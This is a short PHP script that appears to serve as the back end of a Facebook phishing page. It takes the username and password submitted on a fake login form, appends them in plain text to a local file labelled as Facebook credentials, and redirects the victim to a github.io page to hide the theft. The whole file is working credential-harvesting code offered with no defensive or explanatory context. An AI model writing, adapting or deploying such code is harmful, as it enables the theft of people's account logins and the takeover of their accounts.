<?php

file_put_contents("usernames.txt", "Facebook Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);

header('Location: https://hackprehick.github.io/PROYECTO1/index.html');

exit();

?>

